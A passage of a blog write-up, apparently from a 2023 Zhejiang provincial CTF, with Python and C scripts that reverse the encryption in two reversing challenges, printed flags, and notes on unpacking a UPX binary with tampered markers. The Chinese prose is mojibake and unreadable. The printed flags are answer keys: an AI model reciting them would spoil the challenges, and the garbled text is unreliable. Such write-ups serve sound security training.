<span class="hljs-number">46</span>, -<span class="hljs-number">73</span>, -<span class="hljs-number">5</span>, <span class="hljs-number">99</span>, -<span class="hljs-number">100</span>, <span class="hljs-number">46</span>, <span class="hljs-number">59</span>, <span class="hljs-number">32</span>, -<span class="hljs-number">76</span>, <span class="hljs-number">109</span>, <span class="hljs-number">3</span>, <span class="hljs-number">59</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">61</span>, -<span class="hljs-number">56</span>, -<span class="hljs-number">119</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">118</span>, <span class="hljs-number">36</span>, <span class="hljs-number">118</span>, <span class="hljs-number">82</span>,<br>       <span class="hljs-number">3</span>, <span class="hljs-number">95</span>, <span class="hljs-number">106</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">89</span>, <span class="hljs-number">89</span>, -<span class="hljs-number">85</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>, <span class="hljs-number">46</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">7</span>, <span class="hljs-number">127</span>]<br>b = [<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xB7</span>,<br>     <span class="hljs-number">0x79</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xF3</span>,<br>     <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>,<br>     <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>,<br>     <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x54</span>,<br>     <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x88</span>,<br>     <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE9</span>,<br>     <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7A</span>,<br>     <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x1C</span>,<br>     <span class="hljs-number">0x65</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x97</span>,<br>     <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xBD</span>,<br>     <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xF4</span>,<br>     <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xE2</span>,<br>     <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF1</span>]<br>enc = [ctypes.c_uint8(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc]<span class="hljs-comment">#ç»™å®šçš„æ•´æ•°åˆ—è¡¨encè½¬æ¢ä¸ºæ— ç¬¦å·8ä½æ•´æ•°ç±»å‹çš„æ•°ç»„</span><br>enc[<span class="hljs-number">39</span>].value = b.index(enc[<span class="hljs-number">39</span>].value)<span class="hljs-comment">#æºä»£ç forå¾ªç¯å‡ºæ¥åå€¼ä½œä¸ºä¸‹æ ‡ï¼Œæ‰€ä»¥è¿™é‡Œä¸‹æ ‡ä½œä¸ºå€¼</span><br>flag = <span class="hljs-built_in">chr</span>(enc[<span class="hljs-number">39</span>].value)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>    enc[i - <span class="hljs-number">1</span>].value = b.index(enc[i - <span class="hljs-number">1</span>].value) ^ enc[i].value<span class="hljs-comment">#å°†encåˆ—è¡¨ä¸­æ¯ä¸ªå…ƒç´ çš„å€¼ä½œä¸ºç´¢å¼•ï¼Œåœ¨åˆ—è¡¨bä¸­æ‰¾åˆ°å¯¹åº”çš„ç´¢å¼•ä½ç½®ï¼Œå¹¶ä¸å‰ä¸€ä¸ªå…ƒç´ çš„å€¼è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°†ç»“æœèµ‹ç»™å‰ä¸€ä¸ªå…ƒç´ çš„å€¼</span><br>    flag = <span class="hljs-built_in">chr</span>(enc[i-<span class="hljs-number">1</span>].value) + flag<span class="hljs-comment">#åŒæ—¶ï¼Œå°†æ¯æ¬¡è®¡ç®—å¾—åˆ°çš„å€¼è½¬æ¢ä¸ºå­—ç¬¦å½¢å¼ï¼Œå¹¶å°†å…¶ä¾æ¬¡æ‹¼æ¥åˆ°å˜é‡flagçš„å‰é¢ã€‚</span><br><br><span class="hljs-built_in">print</span>(flag)<br>DASCTF&#123;e:-aSy|u9aPR0gr~AMfo~$RrE^VeR$<span class="hljs-number">3</span>!&#125;<br></code></pre></td></tr></table></figure><h2 id="AndroidELF-1"><a href="#AndroidELF-1" class="headerlink" title="AndroidELF-1"></a>AndroidELF-1</h2><p>æ‰“å¼€ä¹‹åå‡½æ•°å¾ˆå°‘ï¼Œæœå­—ç¬¦ä¸²å‘ç°æœ‰upxå£³</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094807343-1bea5c96-7a6e-4056-b695-2d52d76335f6.png" class="" title="img"><p>æ‰¾åˆ°ä¸‰ä¸ªUPXæ ‡å¿—ä½ï¼Œåä¸¤ä¸ªæ˜¯å°å†™ï¼Œæ”¹æˆå¤§å†™åä¿å­˜</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094857412-7023cd94-3e36-481e-aacf-5ed89da91a7b.png" class="" title="img"><p>ç°åœ¨æœ‰å£³äº†</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094879633-de3abd8d-abc9-4f89-b3d2-927d888025b1.png" class="" title="img"><p>è„±å£³</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094914495-b7bfcf31-3cad-42a0-8a18-2f51fa9491d2.png" class="" title="img"><p>æ‰¾flagæ‰¾åˆ°å…³é”®å‡½æ•°</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094988809-19158726-1842-44e7-bb41-cbe72d3be2d1.png" class="" title="img"><p>æœ‰å››ä¸ªå­å‡½æ•°</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094956543-27d4a5e6-621a-4369-9296-dfa8d984f692.png" class="" title="img"><p>ç¬¬ä¸€ä¸ª</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094930239-80d2ef2d-a365-48ac-9792-086d6f2a82fe.png" class="" title="img"><p>gptè¯´æ˜¯æŒ‰bitåè½¬</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699095095280-5ab370da-0341-423b-bb1c-645a4aa7b587.png" class="" title="img"><p>å†é—®gptæ­£é€†å‘è„šæœ¬ä¸€æ ·ï¼Œä¸€å¼€å§‹1&lt;-&gt;7,é€†å‘è¿˜æ˜¯1&lt;-&gt;7</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699166508730-a92fe620-9819-4861-8b7e-bd84fb521c7c.png" class="" title="img"><p>ç¬¬äºŒä¸ªå‡½æ•°ï¼Œæœ‰ä¸‹æ ‡ç½®æ¢</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699095223398-eb4b1ec8-2247-483e-9d27-7b10f63b84d1.png" class="" title="img"><p>ç¬¬ä¸‰ä¸ªå‡½æ•°</p><p>æ˜¯8*ï¼Œè€Œä¸æ˜¯8çš„æ¬¡æ–¹</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699095170273-53951c37-af17-4080-8da7-5a1bf2acafa2.png" class="" title="img"><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1726016866946-8f52cc8d-e99d-4615-a8d8-b9217af600b9.png" class="" title="img"><p>æœ€åçš„å¯†æ–‡</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699095269897-f401335f-53cb-46ab-bff1-2d2d9a2675c8.png" class="" title="img"><p>æ¯”èµ›çš„æ—¶å€™å°±å·®å†™è„šæœ¬ï¼Œè¿˜æ˜¯å¾ˆèœï¼Œæ²¡gptæ ¹æœ¬å†™ä¸äº†ä¸€ç‚¹</p><p>ç”¨pythonæ¯ä¸€è½®éƒ½è¦è€ƒè™‘èŒƒå›´é—®é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x3D</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x52</span>,<br>  <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x5E</span>,<br>  <span class="hljs-number">0x74</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x39</span>,<br>  <span class="hljs-number">0x70</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x3B</span>,<br>  <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>,<br>  <span class="hljs-number">0x29</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>,<br>  <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x71</span>]<br>v4=[<span class="hljs-number">0xd</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0xf</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0xe</span>]<br>b=[<span class="hljs-number">0</span>]*<span class="hljs-number">64</span><br>tmp=[<span class="hljs-number">0</span>]*<span class="hljs-number">16</span><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            a[<span class="hljs-number">16</span>*m+j]^=(<span class="hljs-number">120</span>*i)<br>            a[<span class="hljs-number">16</span>*m+j]=(a[<span class="hljs-number">16</span>*m+j]+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            a[<span class="hljs-number">16</span>*m+j]=(a[<span class="hljs-number">16</span>*m+j]&lt;&lt;<span class="hljs-number">5</span>)|(a[<span class="hljs-number">16</span>*m+j]&gt;&gt;<span class="hljs-number">3</span>)<br>            a[<span class="hljs-number">16</span>*m+j]=(a[<span class="hljs-number">16</span>*m+j]+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            tmp[j]=a[<span class="hljs-number">16</span>*m+j]<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            b[<span class="hljs-number">16</span>*m+j]=tmp[v4[j]]<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            v1=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>                v1|=((b[<span class="hljs-number">16</span>*m+j]&gt;&gt;k)&amp;<span class="hljs-number">1</span>)&lt;&lt;(<span class="hljs-number">7</span>-k)<br>            b[<span class="hljs-number">16</span>*m+j]=v1<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            a[<span class="hljs-number">16</span>*m+j]=b[<span class="hljs-number">16</span>*m+j]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((b[i]+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç”¨cå¯ä»¥ç›´æ¥å®šä¹‰ç±»å‹ï¼Œä½†è¦æ³¨æ„unsigned</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">char</span> mi[<span class="hljs-number">64</span>]=&#123;<span class="hljs-number">0x3D</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x52</span>,<br><span class="hljs-number">0x4C</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x5E</span>,<br><span class="hljs-number">0x74</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x39</span>,<br><span class="hljs-number">0x70</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x3B</span>,<br><span class="hljs-number">0x4D</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x61</span>,<br><span class="hljs-number">0x29</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x29</span>,<br><span class="hljs-number">0x4D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x71</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s[<span class="hljs-number">16</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> v4[<span class="hljs-number">16</span>]=&#123;<span class="hljs-number">0xd</span>,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0xf</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0xe</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp[<span class="hljs-number">16</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">4</span>;k++)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;n&lt;<span class="hljs-number">16</span>;n++)&#123;<br>s[n]=mi[<span class="hljs-number">16</span>*k+n];<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> m=<span class="hljs-number">15</span>;m&gt;=<span class="hljs-number">0</span>;m--)&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span 